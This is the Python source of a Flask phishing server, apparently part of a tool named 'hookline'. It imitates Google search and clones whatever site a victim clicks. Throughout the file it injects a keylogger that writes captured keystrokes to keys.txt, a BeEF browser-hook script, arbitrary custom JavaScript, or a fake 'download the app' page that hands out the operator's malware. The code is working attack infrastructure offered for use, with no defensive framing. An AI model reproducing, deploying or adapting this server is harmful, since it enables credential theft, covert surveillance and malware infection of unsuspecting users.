#imports
from flask import Flask, request, render_template, send_file
from flask_cors import CORS
import requests
from shutil import copyfile
#clone.py comes with hookline
import gclone

#display banner
b = open("banner.txt","r")
print(b.read())
b.close

#the flask server will run on this ip and port
h = input("ip to run on: ")
p = input("port to run on: ")
maldown=""

#menu
print('''
prebuilt pages will not be injected since you may want to use them for custom attacks.
you may however find the script you wish to use and add it to the bottom of your html file.
to use premade pages simply place your html file in the templates folder as <search term>.html 

1. inject keylogger (writes to keys.txt)
2. inject BeEF hook
3. inject custom html or js from file
4. browser is not supported download the app (your malware)
	''')

#choose here
opt = int(input("option: "))

#inject keylogger
if opt == 1:
	#if you are using ngrok etc specify 
	ipb = input("\nip to log keys to (leave blank for same ip): ")
	portb = input("port to log keys to (leave blank for same ip): ")
	if not ipb:
		ipb = h
		print("\nusing same ip")
	if not portb:
		portb = p
		print("using same port")

#inject BeEF hook
if opt == 2:
	bip=input("BeEF ip: ")
	bport=input("BeEF port: ")
	bhooktmp = open("bhook.js","r")
	bhooktmpr = bhooktmp.read()
	bhooktmp.close()
	bhooktmpr = bhooktmpr.replace("~bip~",bip).replace("~bport~",bport)
	bhook = open("static/js/bhook.js","w")
	bhook.write(bhooktmpr)
	bhook.close()

#inject custom html or js
if opt == 3:
	injfname=input("filename: ")

if opt == 4:
	maldown=input("filename: ")
	ipb = input("\nip to download from (leave blank for same ip): ")
	portb = input("port to log keys to (leave blank for same ip): ")
	if not ipb:
		ipb = h
		print("\nusing same ip")
	if not portb:
		portb = p
		print("using same port")
print('''
	popunder location /u (might not work well on firefox sollution coming in v2.0)
	google search location / 
	''')

#initialise app and enable CORS so the keylogger works
app = Flask(__name__)
CORS(app)

#this is so that the fake google search will update live etc
app.config["TEMPLATES_AUTO_RELOAD"] = True

#robots
@app.route("/robots.txt")
def robots():
    return "User-agent: *\rDisallow: *"

#serve tabunder from the yesup popunder library
@app.route("/u")
def u():
	return render_template("under.html")

#serve google seach	
@app.route("/search")
def search(maldown=maldown):
    a = request.args.get("q")
    try:
    	#check for relevant templates
        open("templates/"+a+".html","r")
        template = True
    except:
        template = False
    #clone google search
    gclone.clone(a, template)
    #Search2.html is served after being updated by clone
    f = open("activesearch.txt","w")
    f.write(a)
    f.close()
    if opt == 4:
    	copyfile(maldown,a+"."+maldown.split(".")[1])
    	maldown = a+"."+maldown.split(".")[1]
    return render_template("Search2.html")

#serves premade pages
@app.route("/temp")
def tempfunc():
	tempf = request.args.get("temp")
	return render_template(tempf+".html")

#generates fake versions on link click
@app.route("/link")
def link():
    url = request.args.get("url")
    r = requests.get(url)

    #open page in write mode to replace with site clone
    f = open("templates/page.html","w")

    #keylogger
    if opt == 1:
        scrpt = open("script.html","r")
        scrpt1 = scrpt.read().replace("#h#",ipb).replace("#p#",str(portb))
        jsadd = r.text + scrpt1
    
    #BeEF
    if opt == 2:
        scrpt = open("static/js/bhook.js","r")
        jsadd = r.text + scrpt.read()
    
    #Custom html or js
    if opt == 3:
    	scrpt = open(injfname,"r")
    	jsadd = r.text + scrpt.read()

    if opt == 4:
    	actvsrch = open("activesearch.txt","r")
    	sitenm = actvsrch.read()
    	actvsrch.close()
    	scrpt = open("down.html","r")
    	scrpt1 = scrpt.read()
    	scrpt1 = scrpt1.replace("*search*",sitenm)
    	scrpt1 = scrpt1.replace("*ip*",ipb)
    	scrpt1 = scrpt1.replace("*port*",portb)
    	jsadd = r.text + scrpt1

    #write out clone with chosen code injected
    if not "<base" in jsadd:
    	jsadd = jsadd.replace("<head>","<head><base href=\""+url+"\"/>")
    f.write(jsadd)
    f.close()
    scrpt.close()

    #add the url to our keysfile so we know what site its for
    with open("keys.txt","a") as keyfile:
        keyfile.write(url+"\n")
    keyfile.close()

    #serve the cloned page
    return render_template("page.html")

#keylogger
@app.route("/key")
def key():
	keyget = request.args.get("key")
	keyget = keyget.replace(" Key","")
	with open("keys.txt","a") as keyfile:
		keyfile.write(keyget)
	keyfile.close()
	return key

#google search start
@app.route("/")
def index():
	return render_template("Google.html")

@app.route("/download")
def downloads():
	actvsrch = open("activesearch.txt","r")
	sitenm = actvsrch.read()
	actvsrch.close()
	return send_file(sitenm+"."+maldown.split(".")[1])

#run flask app
if __name__ == "__main__":
    app.run(host=h, port=p)

